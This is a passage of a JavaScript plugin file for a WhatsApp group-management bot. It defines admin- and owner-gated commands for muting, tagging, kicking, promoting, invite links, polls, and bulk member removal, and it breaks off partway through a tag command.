import { fileURLToPath } from 'url';
import config from '../config.js';
import { cmd } from '../command.js';
import { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } from '../lib/functions.js';
import converter from '../lib/converter.js';

const __filename = fileURLToPath(import.meta.url);

// Helper function for Stylist Badi ABC Text
const toStylistUpper = (text) => {
    if (!text || typeof text !== 'string') return '';
    const uppercaseMap = {
        'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ', 'f': 'ғ', 'g': 'ɢ', 'h': 'ʜ', 'i': 'ɪ',
        'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ', 'o': 'ᴏ', 'p': 'ᴘ', 'q': 'ǫ', 'r': 'ʀ',
        's': 's', 't': 'ᴛ', 'u': 'ᴜ', 'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x', 'y': 'ʏ', 'z': 'ᴢ',
        'A': 'ᴀ', 'B': 'ʙ', 'C': 'ᴄ', 'D': 'ᴅ', 'E': 'ᴇ', 'F': 'ғ', 'G': 'ɢ', 'H': 'ʜ', 'I': 'ɪ',
        'J': 'ᴊ', 'K': 'ᴋ', 'L': 'ʟ', 'M': 'ᴍ', 'N': 'ɴ', 'O': 'ᴏ', 'P': 'ᴘ', 'Q': 'ǫ', 'R': 'ʀ',
        'S': 's', 'T': 'ᴛ', 'U': 'ᴜ', 'V': 'ᴠ', 'W': 'ᴡ', 'X': 'x', 'Y': 'ʏ', 'Z': 'ᴢ'
    };
    return text.split('').map(char => uppercaseMap[char] || char).join('');
};

// ==================== UNMUTE COMMAND ====================
cmd({
    pattern: "unmute",
    alias: ["unlock", "open"],
    desc: "Unmute the group (admins only)",
    category: "group",
    react: "🔊",
    filename: __filename
}, async (conn, mek, m, { from, isCreator, isBotAdmins, isAdmins, isGroup, reply }) => {
    try {
        if (!isGroup) return await reply(`⚠️ *${toStylistUpper('This command only works in groups.')}*`);
        if (!isBotAdmins) return await reply(`❌ *${toStylistUpper('I must be admin to unmute the group.')}*`);
        if (!isAdmins && !isCreator) return await reply(`🔐 *${toStylistUpper('Only group admins or owner can use this command.')}*`);

        await conn.groupSettingUpdate(from, 'not_announcement');
        await reply(`🔊 *${toStylistUpper('Group has been unmuted!')}*\n${toStylistUpper('Everyone can send messages now.')}`);

    } catch (err) {
        console.error(err);
        await reply(`❌ *${toStylistUpper('Failed to unmute group. Something went wrong.')}*`);
    }
});

// ==================== MUTE COMMAND ====================
cmd({
    pattern: "mute",
    alias: ["close", "lock"],
    desc: "Mute the group (admins only)",
    category: "group",
    react: "🔇",
    filename: __filename
}, async (conn, mek, m, { from, isCreator, isBotAdmins, isAdmins, isGroup, reply }) => {
    try {
        if (!isGroup) return await reply(`⚠️ *${toStylistUpper('This command only works in groups.')}*`);
        if (!isBotAdmins) return await reply(`❌ *${toStylistUpper('I must be admin to mute the group.')}*`);
        if (!isAdmins && !isCreator) return await reply(`🔐 *${toStylistUpper('Only group admins or owner can use this command.')}*`);

        await conn.groupSettingUpdate(from, 'announcement');
        await reply(`🔇 *${toStylistUpper('Group has been muted!')}*\n${toStylistUpper('Only admins can send messages now.')}`);

    } catch (err) {
        console.error(err);
        await reply(`❌ *${toStylistUpper('Failed to mute group. Something went wrong.')}*`);
    }
});

// ==================== TAGALL COMMAND ====================
cmd({
    pattern: "tagall",
    react: "🔊",
    alias: ["gc_tagall"],
    desc: "To Tag all Members",
    category: "group",
    use: '.tagall [message]',
    filename: __filename
}, async (conn, mek, m, { from, participants, reply, isGroup, isAdmins, isCreator, prefix, command, args, body }) => {
    try {
        if (!isGroup) {
            await conn.sendMessage(from, { react: { text: '❌', key: m.key } });
            return reply(`❌ *${toStylistUpper('This command can only be used in groups.')}*`);
        }

        if (!isAdmins && !isCreator) {
            await conn.sendMessage(from, { react: { text: '❌', key: m.key } });
            return reply(`❌ *${toStylistUpper('Only group admins or the bot owner can use this command.')}*`);
        }

        let groupInfo = await conn.groupMetadata(from).catch(() => null);
        if (!groupInfo) return reply(`❌ *${toStylistUpper('Failed to fetch group information.')}*`);

        let groupName = groupInfo.subject || "Unknown Group";
        let totalMembers = participants ? participants.length : 0;
        if (totalMembers === 0) return reply(`❌ *${toStylistUpper('No members found in this group.')}*`);

        let emojis = ['📢', '🔊', '🌐', '🔰', '❤‍🩹', '🤍', '🖤', '🩵', '📝', '💗', '🔖', '🪩', '📦', '🎉', '🛡️', '💸', '⏳', '🗿', '🚀', '🎧', '🪀', '⚡', '🚩', '🍁', '🗣️', '👻', '⚠️', '🔥'];
        let randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];

        let message = body.slice(body.indexOf(command) + command.length).trim();
        if (!message) message = "Attention Everyone";

        let teks = `╔═════ ⌈ *⚡ ${toStylistUpper('Tag All')}* ⌋ ═════✧\n`;
        teks += `║ 📂 *${toStylistUpper('Group')}:*${groupName}\n`;
        teks += `║ 👥 *${toStylistUpper('Members')}:*${totalMembers}\n`;
        teks += `║ 💬 *${toStylistUpper('Message')}:*${message}\n`;
        teks += `╚══════════════════════✧\n\n`;

        for (let mem of participants) {
            if (!mem.id) continue;
            teks += `${randomEmoji} @${mem.id.split('@')[0]}\n`;
        }

        teks += `\n> 💫 _${toStylistUpper('Kamran-Md Group Manager')}_`;

        conn.sendMessage(from, { text: teks, mentions: participants.map(a => a.id) }, { quoted: mek });

    } catch (e) {
        console.error("TagAll Error:", e);
        reply(`❌ *Error Occurred !!*\n\n${e.message || e}`);
    }
});

// ==================== KICK COMMAND ====================
cmd({
    pattern: "kick1",
    alias: ["k1", "remove1", "nital"],
    desc: "Remove a user from the group",
    category: "group",
    react: "💀",
    filename: __filename
}, async (conn, mek, m, { from, isCreator, isBotAdmins, isAdmins, isGroup, quoted, reply, botNumber2, botNumber }) => {
    try {
        if (!isGroup) return await reply(`⚠️ *${toStylistUpper('This command only works in groups.')}*`);
        if (!isBotAdmins) return await reply(`❌ *${toStylistUpper('I must be admin to remove someone.')}*`);
        if (!isCreator && !isAdmins) return await reply(`🔐 *${toStylistUpper('Only bot owner or group admins can use this command.')}*`);

        if (!m.quoted && (!m.mentionedJid || m.mentionedJid.length === 0)) {
            return await reply(`❓ *${toStylistUpper('You did not give me a user to remove!')}*`);
        }
        let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : null;
        if (!users) return await reply(`⚠️ *${toStylistUpper('Couldn\'t determine target user.')}*`);

        if (users === botNumber || users === botNumber2) return await reply(`🤖 *${toStylistUpper('I can\'t kick myself!')}*`);
        const self = conn.user.id.split(":")[0] + '@s.whatsapp.net';
        if (users === self) return await reply(`👑 *${toStylistUpper('That\'s the owner! I can\'t remove them.')}*`);

        await conn.groupParticipantsUpdate(from, [users], "remove");
        await reply(`*✅ ${toStylistUpper('Successfully removed from group.')}*`, { mentions: [users] });

    } catch (err) {
        console.error(err);
        await reply(`❌ *${toStylistUpper('Failed to remove user. Something went wrong.')}*`);
    }
});

// ==================== PROMOTE COMMAND ====================
cmd({
    pattern: "promote",
    alias: ["p", "giveadmin", "permote", "admin"],
    desc: "Promote a user to admin",
    category: "group",
    react: "💀",
    filename: __filename
}, async (conn, mek, m, { from, isCreator, isBotAdmins, isAdmins, isGroup, quoted, reply, botNumber2, botNumber }) => {
    try {
        if (!isGroup) return await reply(`⚠️ *${toStylistUpper('This command only works in groups.')}*`);
        if (!isBotAdmins) return await reply(`❌ *${toStylistUpper('I must be admin to promote someone.')}*`);
        if (!isAdmins && !isCreator) return await reply(`🔐 *${toStylistUpper('Only group admins or owner can use this command.')}*`);

        if (!m.quoted && (!m.mentionedJid || m.mentionedJid.length === 0)) {
            return await reply(`❓ *${toStylistUpper('You did not give me a user to promote!')}*`);
        }
        let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : null;
        if (!users) return await reply(`⚠️ *${toStylistUpper('Couldn\'t determine target user.')}*`);

        if (users === botNumber || users === botNumber2) return await reply(`🤖 *${toStylistUpper('I can\'t promote myself!')}*`);
        const self = conn.user.id.split(":")[0] + '@s.whatsapp.net';
        if (users === self) return await reply(`👑 *${toStylistUpper('Owner is already super admin!')}*`);

        await conn.groupParticipantsUpdate(from, [users], "promote");
        await reply(`*✅ ${toStylistUpper('Successfully Promoted to Admin.')}*`, { mentions: [users] });

    } catch (err) {
        console.error(err);
        await reply(`❌ *${toStylistUpper('Failed to promote. Something went wrong.')}*`);
    }
});

// ==================== DEMOTE COMMAND ====================
cmd({
    pattern: "demote",
    alias: ["d", "dismiss", "removeadmin"],
    desc: "Demote a group admin",
    category: "group",
    react: "💀",
    filename: __filename
}, async (conn, mek, m, { from, isCreator, isBotAdmins, isAdmins, isGroup, quoted, reply, botNumber2, botNumber }) => {
    try {
        if (!isGroup) return await reply(`⚠️ *${toStylistUpper('This command only works in groups.')}*`);
        if (!isBotAdmins) return await reply(`❌ *${toStylistUpper('I must be admin to demote someone.')}*`);
        if (!isAdmins && !isCreator) return await reply(`🔐 *${toStylistUpper('Only group admins or owner can use this command.')}*`);

        if (!m.quoted && (!m.mentionedJid || m.mentionedJid.length === 0)) {
            return await reply(`❓ *${toStylistUpper('You did not give me a user to demote!')}*`);
        }
        let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : null;
        if (!users) return await reply(`⚠️ *${toStylistUpper('Couldn\'t determine target user.')}*`);

        if (users === botNumber || users === botNumber2) return await reply(`🤖 *${toStylistUpper('I can\'t demote myself!')}*`);
        const self = conn.user.id.split(":")[0] + '@s.whatsapp.net';
        if (users === self) return await reply(`👑 *${toStylistUpper('I can\'t demote the owner!')}*`);

        await conn.groupParticipantsUpdate(from, [users], "demote");
        await reply(`*✅ ${toStylistUpper('Admin Successfully demoted to a normal member.')}*`, { mentions: [users] });

    } catch (err) {
        console.error(err);
        await reply(`❌ *${toStylistUpper('Failed to demote. Something went wrong.')}*`);
    }
});

// ==================== SET GROUP PICTURE COMMAND ====================
cmd({
    pattern: "gcpp",
    alias: ["gpp", "fullppgc", "gcdp", "groupdp"],
    react: "🏙️",
    desc: "Group Admin Only - Set group profile picture",
    category: "group",
    filename: __filename
}, async (conn, mek, m, { from, isCreator, isBotAdmins, isAdmins, isGroup, reply }) => {
    try {
        if (!isGroup) return await reply(`⚠️ *${toStylistUpper('This command only works in groups.')}*`);
        if (!isBotAdmins) return await reply(`❌ *${toStylistUpper('I must be admin to change group picture.')}*`);
        if (!isAdmins && !isCreator) return await reply(`🔐 *${toStylistUpper('Only admins can use this command.')}*`);

        if (!m.quoted) return await reply(`*🍁 ${toStylistUpper('Please reply to an image with .gcpp')}*`);

        const mtype = m.quoted.mtype;
        if (mtype !== "imageMessage") return await reply(`❌ *${toStylistUpper('Only image messages are supported for group picture')}*`);

        const buffer = await m.quoted.download();
        await conn.updateProfilePicture(from, buffer);
        await reply(`*✅ ${toStylistUpper('Group profile picture updated successfully!')}*`);

    } catch (error) {
        console.error("setgcpp Error:", error);
        await reply(`❌ *${toStylistUpper('Error updating group picture:')}*\n` + error.message);
    }
});

// ==================== REVOKE LINK COMMAND ====================
cmd({
    pattern: "revoke",
    alias: ["resetlink", "newlink"],
    desc: "Reset group invite link",
    category: "group",
    react: "🔄",
    filename: __filename
}, async (conn, mek, m, { from, isCreator, isBotAdmins, isAdmins, isGroup, reply }) => {
    try {
        if (!isGroup) return await reply(`⚠️ *${toStylistUpper('This command only works in groups.')}*`);
        if (!isBotAdmins) return await reply(`❌ *${toStylistUpper('I must be admin to reset link.')}*`);
        if (!isAdmins && !isCreator) return await reply(`🔐 *${toStylistUpper('Only admins can use this command.')}*`);

        const newCode = await conn.groupRevokeInvite(from);
        await reply(`*✅ ${toStylistUpper('Link Reset Successful!')}*\n\n🔗 https://chat.whatsapp.com/${newCode}`);

    } catch (err) {
        console.error(err);
        await reply(`❌ *${toStylistUpper('Failed to reset link.')}*`);
    }
});

// ==================== LINK COMMAND ====================
cmd({
    pattern: "link",
    alias: ["invite", "gclink", "invitelink"],
    desc: "Get group invite link",
    category: "group",
    react: "🔗",
    filename: __filename
}, async (conn, mek, m, { from, isGroup, isBotAdmins, reply }) => {
    try {
        if (!isGroup) return await reply(`⚠️ *${toStylistUpper('This command only works in groups.')}*`);
        if (!isBotAdmins) return await reply(`❌ *${toStylistUpper('I must be admin to get the invite link.')}*`);
        
        const inviteCode = await conn.groupInviteCode(from);
        const link = `https://chat.whatsapp.com/${inviteCode}`;
        await reply(`🔗 *${toStylistUpper('Group Invite Link:')}*\n\n${link}`);

    } catch (err) {
        console.error(err);
        await reply(`❌ *${toStylistUpper('Failed to get group link. I may not have admin permission.')}*`);
    }
});

// ==================== GROUP INFO COMMAND ====================
cmd({
    pattern: "ginfo",
    alias: ["groupinfo"],
    desc: "Get group information",
    category: "group",
    react: "🥏",
    filename: __filename
}, async (conn, mek, m, { from, isCreator, isBotAdmins, isAdmins, isGroup, reply, metadata, participants }) => {
    try {
        if (!isGroup) return await reply(`⚠️ *${toStylistUpper('This command only works in groups.')}*`);
        if (!isBotAdmins) return await reply(`❌ *${toStylistUpper('I must be admin to fetch group info.')}*`);
        if (!isAdmins && !isCreator) return await reply(`🔐 *${toStylistUpper('Only admins can use this command.')}*`);

        const groupData = metadata || await conn.groupMetadata(from);
        const groupAdmins = participants?.filter(p => p.admin) || [];
        let description = groupData.desc || 'No description';
        
        let text = `╔═════ ⌈ *⚡ ${toStylistUpper('Group Information')}* ⌋ ═════✧\n`;
        text += `║ 📌 *${toStylistUpper('Name')}:*${groupData.subject}\n`;
        text += `║ 🆔 *${toStylistUpper('ID')}:*${groupData.id}\n`;
        text += `║ 👥 *${toStylistUpper('Participants')}:*${groupData.size}\n`;
        text += `║ ⏱️ *${toStylistUpper('Created')}:*${new Date(groupData.creation * 1000).toLocaleString()}\n`;
        text += `╚══════════════════════✧\n\n`;
        text += `*📝 ${toStylistUpper('Description')}:*\n${description}\n\n`;
        text += `*👑 ${toStylistUpper('Admins')} (${groupAdmins.length}):*\n`;
        
        groupAdmins.forEach((admin, i) => {
            text += `${i+1}. @${admin.id.split('@')[0]}\n`;
        });

        try {
            const ppUrl = await conn.profilePictureUrl(from, 'image');
            await conn.sendMessage(from, {
                image: { url: ppUrl },
                caption: text,
                mentions: groupAdmins.map(a => a.id)
            }, { quoted: mek });
        } catch {
            await reply(text, { mentions: groupAdmins.map(a => a.id) });
        }

    } catch (err) {
        console.error('Group info error:', err);
        await reply(`❌ *${toStylistUpper('Failed to fetch group information. Error:')}* ` + err.message);
    }
});

// ==================== UPDATE GROUP DESCRIPTION COMMAND ====================
cmd({
    pattern: "updategdesc",
    alias: ["gdesc", "setdesc", "groupdesc"],
    desc: "Change the group description",
    category: "group",
    react: "📜",
    filename: __filename
}, async (conn, mek, m, { from, isCreator, isBotAdmins, isAdmins, isGroup, q, reply }) => {
    try {
        if (!isGroup) return await reply(`⚠️ *${toStylistUpper('This command only works in groups.')}*`);
        if (!isBotAdmins) return await reply(`❌ *${toStylistUpper('I must be admin to change group description.')}*`);
        if (!isAdmins && !isCreator) return await reply(`🔐 *${toStylistUpper('Only admins can use this command.')}*`);
        
        if (!q) return await reply(`❌ *${toStylistUpper('Please provide a new group description.')}*\n${toStylistUpper('Example')}: \`gdesc Welcome to our group!\``);

        if (q.length > 500) return await reply(`⚠️ *${toStylistUpper('Description is too long (max 500 characters).')}*`);

        await conn.groupUpdateDescription(from, q);
        await reply(`✅ *${toStylistUpper('Group description updated successfully!')}*`);

    } catch (err) {
        console.error(err);
        await reply(`❌ *${toStylistUpper('Failed to update group description.')}*`);
    }
});

// ==================== UPDATE GROUP NAME COMMAND ====================
cmd({
    pattern: "updategname",
    alias: ["gname", "setname", "groupname"],
    desc: "Change the group name",
    category: "group",
    react: "📝",
    filename: __filename
}, async (conn, mek, m, { from, isCreator, isBotAdmins, isAdmins, isGroup, q, reply }) => {
    try {
        if (!isGroup) return await reply(`⚠️ *${toStylistUpper('This command only works in groups.')}*`);
        if (!isBotAdmins) return await reply(`❌ *${toStylistUpper('I must be admin to change group name.')}*`);
        if (!isAdmins && !isCreator) return await reply(`🔐 *${toStylistUpper('Only admins can use this command.')}*`);
        
        if (!q) return await reply(`❌ *${toStylistUpper('Please provide a new group name.')}*\n${toStylistUpper('Example')}: \`gname My New Group\``);

        if (q.length > 100) return await reply(`⚠️ *${toStylistUpper('Group name is too long (max 100 characters).')}*`);

        await conn.groupUpdateSubject(from, q);
        await reply(`✅ *${toStylistUpper('Group name changed to:')}* *${q}*`);

    } catch (err) {
        console.error(err);
        await reply(`❌ *${toStylistUpper('Failed to update group name.')}*`);
    }
});

// ==================== POLL COMMAND ====================
cmd({
    pattern: "poll",
    alias: ["vote", "survey"],
    desc: "Create a poll with question and options",
    category: "group",
    filename: __filename,
}, async (conn, mek, m, { from, isCreator, isAdmins, isGroup, q, reply }) => {
    try {
        if (!isGroup) return await reply(`⚠️ *${toStylistUpper('This command only works in groups.')}*`);
        if (!isAdmins && !isCreator) return await reply(`🔐 *${toStylistUpper('Only admins can create polls.')}*`);
        
        if (!q) {
            return await reply(`❓ *${toStylistUpper('Usage')}:* \`poll Question;Option1,Option2,Option3\`\n${toStylistUpper('Example')}: \`poll Best color?;Red,Blue,Green,Black\``);
        }

        const parts = q.split(";");
        if (parts.length < 2) {
            return await reply(`⚠️ *${toStylistUpper('Please provide both question and options.')}*\n${toStylistUpper('Format')}: Question;Option1,Option2,Option3`);
        }

        const question = parts[0].trim();
        const optionsString = parts[1].trim();

        if (!question || !optionsString) {
            return await reply(`⚠️ *${toStylistUpper('Question and options are required.')}*`);
        }

        const options = optionsString.split(",").map(opt => opt.trim()).filter(opt => opt.length > 0);

        if (options.length < 2) return await reply(`❌ *${toStylistUpper('Please provide at least two options.')}*`);
        if (options.length > 12) return await reply(`⚠️ *${toStylistUpper('Maximum 12 options allowed.')}*`);

        await conn.sendMessage(from, {
            poll: {
                name: question,
                values: options,
                selectableCount: 1,
                toAnnouncementGroup: true,
            }
        }, { quoted: mek });

    } catch (err) {
        console.error(err);
        await reply(`❌ *${toStylistUpper('Failed to create poll.')}*`);
    }
});

// ==================== OUT COMMAND (Remove by Country Code) ====================
cmd({
    pattern: "out",
    alias: ["ck", "🦶"],
    desc: "Removes all members with specific country code from the group",
    category: "group",
    react: "❌",
    filename: __filename
}, async (conn, mek, m, { from, q, isGroup, isBotAdmins, reply, groupMetadata, isCreator }) => {
    if (!isGroup) return reply(`❌ *${toStylistUpper('This command can only be used in groups.')}*`);
    if (!isCreator) return await conn.sendMessage(from, { text: `*📛 ${toStylistUpper('This is an owner command.')}*` }, { quoted: mek });
    if (!isBotAdmins) return reply(`❌ *${toStylistUpper('I need to be an admin to use this command.')}*`);
    if (!q) return reply(`❌ *${toStylistUpper('Please provide a country code. Example: .out 92')}*`);

    const countryCode = q.trim();
    if (!/^\d+$/.test(countryCode)) {
        return reply(`❌ *${toStylistUpper('Invalid country code. Please provide only numbers')}*`);
    }

    try {
        const participants = await groupMetadata.participants;
        const targets = participants.filter(participant => participant.id.startsWith(countryCode) && !participant.admin);

        if (targets.length === 0) return reply(`❌ *${toStylistUpper('No members found with country code')} +${countryCode}*`);

        const jids = targets.map(p => p.id);
        await conn.groupParticipantsUpdate(from, jids, "remove");
        reply(`✅ *${toStylistUpper('Successfully removed')}${targets.length} ${toStylistUpper('members with country code')} +${countryCode}*`);
    } catch (error) {
        console.error("Out command error:", error);
        reply(`❌ *${toStylistUpper('Failed to remove members. Error:')}* ` + error.message);
    }
});

// ==================== NEW GROUP CREATE COMMAND ====================
cmd({
    pattern: "newgc",
    alias: ["creategroup", "makegroup"],
    desc: "Create a new group and add participants",
    category: "group",
    filename: __filename,
}, async (conn, mek, m, { from, isCreator, body, reply }) => {
    try {
        if (!isCreator) return await reply(`🔐 *${toStylistUpper('Only bot owner can use this command.')}*`);
        
        if (!body) {
            return await reply(`❓ *${toStylistUpper('Usage')}:* \`newgc Group Name;number1,number2,...\`\n${toStylistUpper('Example')}: \`newgc My Group;923001234567,923009876543\``);
        }

        const parts = body.split(";");
        if (parts.length < 2) return await reply(`⚠️ *${toStylistUpper('Please provide both group name and numbers.')}*`);

        const groupName = parts[0].trim();
        const numbersString = parts[1].trim();

        if (!groupName || !numbersString) return await reply(`⚠️ *${toStylistUpper('Group name and numbers are required.')}*`);

        const participantNumbers = numbersString.split(",").map(num => {
            let cleanNum = num.trim();
            if (cleanNum.startsWith("3")) cleanNum = "92" + cleanNum;
            return cleanNum.includes('@') ? cleanNum : `${cleanNum}@s.whatsapp.net`;
        }).filter(num => num.match(/^\d+@s\.whatsapp\.net$/));

        if (participantNumbers.length === 0) return await reply(`❌ *${toStylistUpper('No valid phone numbers provided.')}*`);

        const ownerJid = conn.user.id.split(':')[0] + '@s.whatsapp.net';
        if (!participantNumbers.includes(ownerJid)) participantNumbers.push(ownerJid);

        const group = await conn.groupCreate(groupName, participantNumbers);
        const inviteCode = await conn.groupInviteCode(group.id);
        const inviteLink = `https://chat.whatsapp.com/${inviteCode}`;

        await conn.sendMessage(group.id, { text: `🎉 *${toStylistUpper('Welcome to')} ${groupName}!*\n\n${toStylistUpper('Group created successfully!')}\n${toStylistUpper('Invite Link')}:${inviteLink}` });
        await reply(`✅ *${toStylistUpper('Group created successfully!')}*\n\n📌 *${toStylistUpper('Name')}:*${groupName}\n👥 *${toStylistUpper('Members')}:*${participantNumbers.length}\n🔗 *${toStylistUpper('Link')}:*${inviteLink}`);

    } catch (err) {
        console.error(err);
        if (err.message?.includes("401")) await reply(`❌ *${toStylistUpper('I\'m not authorized to create groups.')}*`);
        else if (err.message?.includes("invalid")) await reply(`❌ *${toStylistUpper('Invalid phone number(s) provided.')}*`);
        else await reply(`❌ *${toStylistUpper('Failed to create group:')}* ` + (err.message || "Unknown error"));
    }
});

// ==================== LEAVE GROUP COMMAND ====================
cmd({
    pattern: "leave",
    alias: ["left", "leftgc", "leavegc"],
    desc: "Leave the group",
    react: "🎉",
    category: "owner",
    filename: __filename
}, async (conn, mek, m, { from, isGroup, isCreator, reply }) => {
    try {
        if (!isGroup) return reply(`❗ *${toStylistUpper('This command can only be used in groups.')}*`);
        if (!isCreator) return reply(`❗ *${toStylistUpper('This command can only be used by my owner.')}*`);

        await reply(`👋 *${toStylistUpper('Goodbye everyone!')}*${toStylistUpper('I am leaving the group now. Thanks for having me here!')} ❤️`);
        await sleep(1500);
        await conn.groupLeave(from);

    } catch (e) {
        console.error(e);
        reply(`❌ Error: ${e.message}`);
    }
});

// ==================== END GROUP (Kick All) COMMAND ====================
cmd({
    pattern: "end",
    alias: ["byeall", "kickall", "endgc", "nuke"],
    desc: "Removes all members from group except specified numbers",
    category: "group",
    react: "⚠️",
    filename: __filename
}, async (conn, mek, m, { from, isCreator, isBotAdmins, botNumber2, botNumber, isGroup, sender, metadata, reply }) => {
    try {
        if (!isGroup) return await reply(`⚠️ *${toStylistUpper('This command only works in groups.')}*`);
        if (!isBotAdmins) return await reply(`❌ *${toStylistUpper('I must be admin to remove members.')}*`);
        if (!isCreator) return await reply(`🔐 *${toStylistUpper('Only bot owner can use this command.')}*`);

        const ignoreJids = [botNumber2, botNumber, sender];
        const groupData = metadata || await conn.groupMetadata(from);
        const participants = groupData.participants || [];
        const targets = participants.filter(p => !ignoreJids.includes(p.id));
        const jids = targets.map(p => p.id);

        if (jids.length === 0) return await reply(`✅ *${toStylistUpper('No members to remove (everyone is excluded).')}*`);

        await conn.groupParticipantsUpdate(from, jids, "remove");
        await reply(`✅ *${toStylistUpper('Successfully removed')} ${jids.length}${toStylistUpper('members from the group.')}*`);

    } catch (err) {
        console.error(err);
        await reply(`❌ *${toStylistUpper('Failed to remove members. I may not have admin permission.')}*`);
    }
});

// ==================== JOIN GROUP COMMAND ====================
cmd({
    pattern: "join",
    alias: ["j", "joinlink", "gclink"],
    desc: "Join a group using invite link",
    category: "group",
    react: "⚙️",
    filename: __filename
}, async (conn, mek, m, { isCreator, q, quoted, reply }) => {
    try {
        if (!isCreator) return await reply(`🔐 *${toStylistUpper('Only bot owner can use this command.')}*`);
        
        let link;

        if (quoted && quoted.text) {
            const linkMatch = quoted.text.match(/chat\.whatsapp\.com\/([a-zA-Z0-9_-]+)/);
            if (linkMatch) link = linkMatch[1];
        }
        
        if (!link && q) {
            const linkMatch = q.match(/chat\.whatsapp\.com\/([a-zA-Z0-9_-]+)/);
            if (linkMatch) link = linkMatch[1];
        }

        if (!link) return await reply(`❌ *${toStylistUpper('Please provide a valid WhatsApp group invite link.')}*`);

        link = link.split('?')[0];

        try {
            await conn.groupAcceptInvite(link);
            await reply(`✅ *${toStylistUpper('Successfully joined the group!')}*`);
        } catch (err) {
            if (err.message?.includes("already")) return await reply(`ℹ️ *${toStylistUpper('I\'m already in this group.')}*`);
            else if (err.message?.includes("expired")) return await reply(`❌ *${toStylistUpper('This link has expired or been reset.')}*`);
            else if (err.message?.includes("invalid")) return await reply(`❌ *${toStylistUpper('Invalid group link.')}*`);
            else await reply(`❌ *${toStylistUpper('Failed to join group:')}* ` + (err.message || "Unknown error"));
        }

    } catch (err) {
        console.error(err);
        await reply(`❌ *${toStylistUpper('An error occurred while processing the command.')}*`);
    }
});

// ==================== INVITE COMMAND ====================
cmd({
    pattern: "invite",
    alias: ["aja"],
    desc: "Send group invite link to someone",
    category: "group",
    filename: __filename,
    react: "📨"
}, async (conn, mek, m, { from, args, isGroup, isBotAdmins, isCreator, isAdmins, reply }) => {
    try {
        if (!isGroup) return await reply(`⚠️ *${toStylistUpper('Group only.')}*`);
        if (!isBotAdmins) return await reply(`❌ *${toStylistUpper('I need admin.')}*`);
        if (!isCreator && !isAdmins) return await reply(`🔐 *${toStylistUpper('Admins only.')}*`);
        
        if (!args[0]) {
            const code = await conn.groupInviteCode(from);
            return await reply(`🔗 *${toStylistUpper('Group Link:')}*\nhttps://chat.whatsapp.com/${code}`);
        }

        let number = args[0].replace(/[^0-9]/g, '');
        if (number.length < 10) return await reply(`⚠️ *${toStylistUpper('Invalid number.')}*`);
        
        let jid = number + "@s.whatsapp.net";
        const metadata = await conn.groupMetadata(from);
        const code = await conn.groupInviteCode(from);
        const link = `https://chat.whatsapp.com/${code}`;
        
        await conn.sendMessage(jid, { text: `📨 *${toStylistUpper('You\'re invited to join')} ${metadata.subject}*\n\n🔗 ${link}\n\n👤 *${toStylistUpper('Invited by')}:* @${m.sender.split('@')[0]}` });
        await reply(`📨 *${toStylistUpper('Invite sent to')}* @${number}`, { mentions: [jid] });

    } catch (err) {
        console.error(err);
        await reply(`❌ *${toStylistUpper('Failed to send invite.')}*`);
    }
});

// ==================== HIDETAG COMMAND (Creator Only) ====================
cmd({
    pattern: "hidetag",
    alias: ["h"],
    react: "🔇",
    desc: "Hidden tag with custom message (Creator only) - Works with reply or direct message",
    category: "owner",
    use: '.h Hello everyone OR reply to any message with .h',
    filename: __filename
}, async (conn, mek, m, { from, q, isGroup, isCreator, reply }) => {
    try {
        if (!isGroup) return reply(`❌ *${toStylistUpper('This command can only be used in groups.')}*`);
        if (!isCreator) return reply(`❌ *${toStylistUpper('Only the bot creator can use this command.')}*`);

        if (!m.quoted && !q) return reply(`❌ *${toStylistUpper('Please provide a message or reply to media.')}*`);

        await conn.sendMessage(from, { react: { text: "⏳", key: mek.key } });
        
        const groupMetadata = await conn.groupMetadata(from);
        const participants = groupMetadata.participants;
        const mentionedJid = participants.map(p => p.id);
        
        let messageContent = {};

        if (m.quoted) {
            const quotedMsg = m.quoted;
            const mimeType = (quotedMsg.msg || quotedMsg).mimetype || '';
            const caption = quotedMsg.text || q || "";
            
            if (!mimeType) {
                messageContent = { text: caption || "📢 Hidden tag", mentions: mentionedJid };
            } else if (mimeType.startsWith('image/')) {
                const buffer = await quotedMsg.download();
                messageContent = { image: buffer, caption: caption || "", mimetype: mimeType, mentions: mentionedJid };
            } else if (mimeType.startsWith('video/')) {
                const buffer = await quotedMsg.download();
                const isGif = quotedMsg.message?.videoMessage?.gifPlayback || false;
                messageContent = { video: buffer, caption: caption || "", gifPlayback: isGif, mimetype: mimeType, mentions: mentionedJid };
            } else if (mimeType.startsWith('audio/')) {
                const buffer = await quotedMsg.download();
                const voiceNote = await converter.toPTT(buffer, 'mp3');
                messageContent = { audio: voiceNote, mimetype: 'audio/ogg; codecs=opus', ptt: true, mentions: mentionedJid };
            } else if (mimeType.includes('sticker')) {
                const buffer = await quotedMsg.download();
                messageContent = { sticker: buffer, mentions: mentionedJid };
            } else {
                messageContent = { text: caption || "📢 Hidden tag", mentions: mentionedJid };
            }
        } else if (q) {
            messageContent = { text: q, mentions: mentionedJid };
        }

        await conn.sendMessage(from, messageContent);
        await conn.sendMessage(from, { react: { text: "✅", key: mek.key } });

    } catch (e) {
        console.error("Hidden Tag Error:", e);
        reply(`❌ Error: ${e.message}`);
        await conn.sendMessage(from, { react: { text: "❌", key: mek.key } });
    }
});

// ==================== TAG COMMAND (Admins + Creator) ====================
cmd({
    pattern: "tag",
    alias: ["taggc"],
    react: "🔊",
    desc: "Tag all members (Admins & Creator) - Works with reply or direct message",
    category: "group",
    use: '.tag Hello everyone OR reply to any message with .tag',
    filename: __filename
}, async (conn, mek, m, { from, q, isGroup, isCreator, isAdmins, reply }) => {
    try {
        if (!isGroup) return reply(`❌ *${toStylistUpper('This command can only be used in groups.')}*`);
        if (!isAdmins && !isCreator) return reply(`❌ *${toStylistUpper('Only group admins can use this command.')}*`);

        if (!m.quoted && !q) return reply(`❌ *${toStylistUpper('Please provide a message or reply to media to tag all members.')}*`);

        await conn.sendMessage(from, { react: { text: "⏳", key: mek.key } });
        
        const groupMetadata = await conn.groupMetadata(from);
